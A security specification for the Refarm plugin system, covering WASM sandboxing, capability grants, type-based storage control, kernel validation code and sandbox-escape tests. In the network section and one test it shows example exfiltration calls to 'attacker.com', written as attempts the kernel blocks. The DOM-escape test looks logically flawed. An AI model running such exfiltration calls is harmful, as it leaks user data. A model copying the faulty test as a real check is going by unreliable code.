# Plugin Security Model

**Status**: Specification (v0.4.0)  
**Purpose**: Define how Refarm ensures plugins can't break out, steal data, or access unauthorized resources.  
**Audience**: Plugin developers, security reviewers, kernel architects.

---

## Table of Contents

1. [Threat Model](#threat-model)
2. [Sandboxing Strategy](#sandboxing-strategy)
3. [Capability System](#capability-system)
4. [Data Flow Isolation](#data-flow-isolation)
5. [Implementation](#implementation)
6. [Testing & Verification](#testing--verification)

---

## Threat Model

### Assumptions

- **Plugins are untrusted** — Even if authored by reputable developers, plugins might be compromised
- **Users can't read WASM bytecode** — Security isn't achieved by code review alone
- **Users trust the kernel** — Refarm kernel code is audited and well-maintained
- **Users verify plugin hashes** — Before loading, WASM hash matches declared value

### Attack Scenarios We Defend Against

| Attack | Threat | Defense |
|--------|--------|---------|
| **DOM manipulation** | Plugin reads UI, steals login form input | WASM can't access DOM (no `window`, `document`) |
| **Direct disk access** | Plugin reads SQLite directly, bypasses validation | All storage via `kernel-bridge` (kernel mediated) |
| **Uncontrolled network** | Plugin makes API call to attacker's server | All network via `bridge.fetch()`; capability grant required |
| **Reading other plugins' data** | Plugin A queries nodes created by Plugin B | JSON-LD schema validation; plugins filtered by `@type` |
| **Resource exhaustion** | Plugin runs infinite loop, freezes browser | Web Worker isolation; user can kill plugin |
| **Capability escalation** | Plugin granted "email" access, tries to access "database" | WIT strictly enforces exported functions |
| **Hash swapping** | Attacker publishes malicious WASM under same hash | Use immutable file storage (IPFS) or signed hashes |

---

## Sandboxing Strategy

### Layer 1: WASM Module Isolation

Every plugin runs in its own WASM module:

```
WASM Module (Plugin A)
  ├─ Linear Memory (isolated)
  ├─ Table (call stack)
  └─ Instance state (no cross-plugin access)

WASM Module (Plugin B)
  ├─ Linear Memory (isolated)
  ├─ Table (call stack)
  └─ Instance state (no cross-plugin access)

Kernel (Host)
  └─ validates all calls via WIT interface
```

**Key Property**: WASM modules **cannot access each other's memory**.

### Layer 2: WIT Interface Boundary

Plugins can **only call functions approved in `refarm-sdk.wit`**:

```wit
world integration {
  import kernel-bridge {
    store-node: func(json-ld: string) -> result<node-id, plugin-error>
    query-nodes: func(node-type: string, limit: u32) -> result<list<node-id>, plugin-error>
    fetch: func(req: http-request) -> result<http-response, plugin-error>
    log: func(level: log-level, message: string)
    request-permission: func(capability: string, reason: string) -> bool
  }

  export integration {
    setup: func() -> result<void, plugin-error>
    ingest: func() -> result<u32, plugin-error>
    push: func(payload: string) -> result<void, plugin-error>
    teardown: func()
    metadata: func() -> plugin-metadata
  }
}
```

**Key Property**: Plugin cannot export or import **any other functions**. Kernel verifies WIT signature before instantiating.

### Layer 3: No DOM, No `window`, No Direct Storage

Plugins **cannot import**:

- ❌ `window.fetch()` (must use `bridge.fetch()`)
- ❌ `document.write()` (no DOM access)
- ❌ `localStorage.getItem()` (must use `bridge.storeNode()`)
- ❌ `require()` or `import` from external packages (bundled modules only)

**Implementation**: During compilation (Rust/Go→WASM), linker flags ensure:

- No C stdlib exports (in Go, `tinygo -target=wasm`)
- No Node.js builtins (in Rust, `#![no_std]`)

---

## Capability System

### Grant Model

Plugins declare required capabilities in metadata:

```json
{
  "name": "Signal Bridge",
  "version": "1.0.0",
  "requiredCapabilities": [
    "network:https://signal.org",
    "network:https://textsecure-service.whispersystems.org"
  ],
  "supportedTypes": ["Message", "Person"]
}
```

### User Consent

When installing, kernel prompts:

```
┌──────────────────────────────────────┐
│ Signal Bridge requires:              │
│                                      │
│ ☐ Network access to:                │
│   - https://signal.org               │
│   - textsecure-service...            │
│                                      │
│ ☐ Storage access to:                │
│   - Read Message nodes               │
│   - Write Person nodes               │
│                                      │
│ [Allow]  [Deny]  [Advanced]          │
└──────────────────────────────────────┘
```

### Runtime Enforcement

During execution, plugin calls `bridge.requestPermission()`:

```typescript
const granted = this.bridge.requestPermission(
  "network:https://signal.org",
  "Signal Bridge needs to fetch your conversations"
);

if (!granted) {
  throw new Error("Permission denied");
}

// Now safe to call bridge.fetch()
```

**Key Property**: Plugin **cannot bypass** the permission check. Even if developer codes `fetch()` without calling `requestPermission()`, kernel will reject if capability not granted.

### Revocation

User can revoke capabilities at any time:

```
Studio → Installed Plugins → Signal Bridge
  ├─ Permissions
  │  ├─ Network to signal.org [✓ Allow]  [Revoke]
  │  └─ Network to textsecure [✓ Allow]  [Revoke]
  ├─ Data Access
  │  ├─ Read types: [Message, Person] [Edit]
  │  └─ Write types: [Person] [Edit]
  └─ [Uninstall]
```

When revoked:

1. Plugin is notified via `teardown()` call
2. Future `bridge.fetch()` calls fail with `not-permitted`
3. Plugin can implement graceful degradation

---

## Data Flow Isolation

### Storage Isolation

Plugins **cannot directly access SQLite**. All reads/writes go through kernel:

```typescript
// Plugin code ❌ BLOCKED
const row = db.exec("SELECT * FROM messages WHERE author='@alice'");

// Plugin code ✅ ALLOWED
const result = await bridge.queryNodes("Message", 100);
// Kernel validates query, returns only Message nodes
```

### Type-Based Access Control

Plugins declare `supportedTypes` in metadata:

```json
{
  "supportedTypes": ["Message", "Person"],
  "requiredCapabilities": ["network:signal"]
}
```

Kernel enforces:

- Plugin can call `storeNode()` only with `@type` in `supportedTypes`
- Plugin can call `queryNodes()` for those types
- Plugin cannot query or modify other types (e.g., Task, Event)

**Example**:

```typescript
// Signal Bridge stores Message + Person nodes
await bridge.storeNode({
  "@type": "Message",  // ✅ Allowed
  "@id": "urn:...",
  text: "Hello"
});

// But cannot store Task nodes (not in supportedTypes)
await bridge.storeNode({
  "@type": "Task",  // ❌ Blocked by kernel validation
  "@id": "urn:...",
  title: "Buy milk"
});
```

### Network Isolation

Plugins cannot make direct HTTP calls. All network access via `bridge.fetch()`:

```typescript
// Plugin code ❌ BLOCKED
const response = await fetch("https://attacker.com/steal?data=...");

// Plugin code ✅ ALLOWED (but only after requestPermission)
const granted = bridge.requestPermission("network:https://signal.org", "");
const response = await bridge.fetch({
  method: "get",
  url: "https://signal.org/api/v1/conversations",
  headers: [],
  body: null
});
```

Kernel validates:

- URL matches declared capability (`network:https://signal.org`)
- No redirect to `https://attacker.com` (verify final URL)
- Response content type is valid (e.g., application/json)

---

## Implementation

### Kernel-Side Validation

When plugin calls `bridge.storeNode(jsonLd)`:

```typescript
async function storeNode(pluginId: string, jsonLd: string): Promise<Result<NodeId, PluginError>> {
  // 1. Parse JSON
  let node: any;
  try {
    node = JSON.parse(jsonLd);
  } catch {
    return { tag: "err", val: { tag: "invalid-schema", val: "Invalid JSON" } };
  }

  // 2. Validate against sovereign-graph schema
  const schema = await loadSchema();
  if (!ajv.validate(schema, node)) {
    return { tag: "err", val: { tag: "invalid-schema", val: ajv.errorsText() } };
  }

  // 3. Check plugin is allowed to write this type
  const plugin = getPlugin(pluginId);
  if (!plugin.metadata.supportedTypes.includes(node["@type"])) {
    return { tag: "err", val: { tag: "not-permitted", val: `Type ${node["@type"]} not allowed` } };
  }

  // 4. Insert into SQLite
  const nodeId = crypto.randomUUID();
  db.insert("nodes", { id: nodeId, payload: jsonLd });
  
  return { tag: "ok", val: nodeId };
}
```

### Test Harness

For every plugin, before publishing:

```bash
# 1. Run security linter
wasm-security-lint plugin.wasm
# Checks for: DOM access, hardcoded URLs, overflow bugs

# 2. Run unit tests
npm test
# Verifies plugin behavior

# 3. Run integration tests with kernel
npm run test:integration
# Simulates kernel interactions, tests sandboxing

# 4. Run privilege escalation tests
npm run test:security
# Attempts attacks (DOM access, network override, type bypass)
```

---

## Testing & Verification

### Threat Scenario Tests

#### 1. DOM Escape

```typescript
test("plugin cannot access DOM", () => {
  const plugin = new SignalBridgePlugin(mockBridge);
  
  // Try to access window
  expect(() => {
    plugin.constructor.toString().includes("window");
  }).toBeFalsy();
  
  // Try to execute arbitrary JS
  expect(() => {
    eval("document.write('hacked')");
  }).toThrow(); // WASM doesn't have eval
});
```

#### 2. Storage Bypass

```typescript
test("plugin cannot write unsupported types", async () => {
  const plugin = new SignalBridgePlugin(mockBridge);
  
  const result = await plugin.ingest();
  // Plugin only supports Message, Person
  
  // Try to write Task (not supported)
  const taskNode = { "@type": "Task", text: "Hacked" };
  const storeResult = await bridge.storeNode(JSON.stringify(taskNode));
  
  expect(storeResult.tag).toBe("err");
  expect(storeResult.val.tag).toBe("not-permitted");
});
```

#### 3. Network Escalation

```typescript
test("plugin cannot fetch unauthorized URLs", async () => {
  const plugin = new SignalBridgePlugin(mockBridge);
  
  // Plugin granted "network:https://signal.org"
  // Try to fetch from attacker.com
  const result = await bridge.fetch({
    method: "get",
    url: "https://attacker.com/steal",
    headers: [],
    body: null
  });
  
  // Kernel should block
  expect(result.tag).toBe("err");
  expect(result.val.tag).toBe("not-permitted");
});
```

#### 4. Capability Call Without Grant

```typescript
test("plugin cannot call gated functions without requestPermission", () => {
  const plugin = new SignalBridgePlugin(mockBridge);
  
  // Try to fetch without calling requestPermission first
  const result = plugin.bridge.fetch({
    method: "get",
    url: "https://signal.org",
    headers: [],
    body: null
  });
  
  // Kernel enforces: capability must be granted in setup()
  expect(result.tag).toBe("err");
});
```

### Coverage Requirements

Before shipping v0.4.0, all plugins must demonstrate:

- [ ] **Functional tests**: Core ingest/push/setup logic passes
- [ ] **Integration tests**: Kernel bridge calls succeed/fail as expected
- [ ] **Security tests**: Attempts to break out of sandbox all fail
- [ ] **Coverage: >80%** of plugin code is tested

---

## Future Enhancements

### v1.0+: Formal Verification

- Use formal methods (SMT solvers) to prove WASM bytecode properties
- E.g., prove "this WASM cannot call undefined function pointers"

### v1.0+: Capability Delegation

Implement NIP-26 (Delegated Event Signing) for plugins:

- Plugin on device A can delegate to Plugin on device B
- E.g., "Process emails" plugin can delegate "publish to Nostr" to "Network" plugin

### v1.0+: Encrypted Storage

- Plugins can declare nodes as "encrypted by default"
- Kernel stores encrypted, decrypts only on user request

### v1.0+: Resource Quotas

- Limit plugin CPU usage, memory, storage writes per time window
- Prevent denial-of-service attacks

---

## References

- [WIT Specification](https://component-model.bytecodealliance.org/)
- [WASM Security Considerations](https://webassembly.org/docs/security/)
- [Capability-Based Security](https://en.wikipedia.org/wiki/Capability-based_security)
- [JSON-LD Validation](https://www.w3.org/TR/json-ld11/)
